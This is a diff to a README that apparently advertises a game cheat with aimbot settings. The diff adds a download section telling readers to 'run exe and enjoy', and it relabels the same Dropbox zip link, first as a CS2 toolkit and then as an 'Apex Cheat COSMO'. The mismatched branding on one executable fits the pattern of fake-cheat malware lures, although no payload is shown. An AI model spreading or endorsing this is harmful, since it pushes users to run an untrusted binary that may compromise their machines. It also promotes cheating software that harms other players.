@@ -23,8 +23,12 @@
 | **Aimbot Bone**                           | Choose body part to aim at (Head, Neck, Body, Pelvis)             |
 
 ---
+## DOWNLOAD ! 
+ Instruction:
+run exe and enjoy ! 
 
-[![Download](https://img.shields.io/badge/Download-CS2%20Performance%20%26%20Practice%20Toolkit-brightgreen?style=for-the-badge)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+[![Download](https://img.shields.io/badge/Apex%20Cheat%20COSMO-red?style=for-the-badge&logo=apexlegends&logoColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+
 
 ## Windows 10/11
 ## Intel/AMD
